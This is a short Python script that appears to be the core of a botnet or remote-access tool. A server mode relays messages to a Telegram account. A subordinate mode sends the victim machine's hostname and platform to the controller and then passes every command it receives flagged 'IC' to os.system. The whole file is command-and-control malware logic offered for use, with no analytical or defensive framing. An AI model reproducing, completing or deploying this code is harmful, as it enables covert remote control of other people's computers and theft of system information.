from BCN.Proccesing.utils import Utils as IOP
from BCN.twm import TellWithMe as SeTWM
from Subord.twm import TellWithMe as SuTWM
import os, socket, platform, time

io = IOP()

configs = io.load_json("./data/env.json")

if configs["role"] == "Server":
    from BCN.Communication.TelegramCom import bot
    twm = SeTWM()
    while True:
        if twm.check_for_messages():
            receive, flag = twm.receive()
            bot.send_message(configs["Telegram"]["MAIN_USER_ID"], f"Flag:{flag}, Receive:{str(receive)}") if flag == "IR" else None
        time.sleep(3.5)
        
         
else:
    twm = SuTWM()
    twm.send(twm.compile_command("IND", f"{socket.gethostname()}, {platform.platform()}"), "0.0.0", "IND", "Hi Server! Can you give me an address?")
    while True:
        if twm.check_for_messages():
            receive, flag = twm.receive()
            os.system(str(receive)) if flag == "IC" else None
        time.sleep(3.5)